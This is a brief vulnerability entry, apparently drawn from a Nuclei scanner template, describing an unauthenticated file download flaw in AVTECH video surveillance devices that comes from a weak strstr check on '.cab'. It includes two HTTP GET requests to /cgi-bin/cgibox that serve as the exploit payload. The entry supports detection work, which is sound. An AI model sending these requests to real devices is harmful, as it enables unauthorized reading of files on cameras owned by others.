# Vulnerability: AVTECH Video Surveillance Product - Unauthenticated File Download
**Classification:** EXPOSURE
**Source:** Nuclei Template (`avtech-unauth-file-download.yaml`)

## Description
AVTECH video surveillance products unauthenticated file download from web root through /cgi-bin/cgibox, Since the .cab string is verified by the strstr method, the file download can be realized by adding ?.cab at the end of the file name.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/cgi-bin/cgibox?.cab
GET {{BaseURL}}/cgi-bin/cgibox?/nobody
```

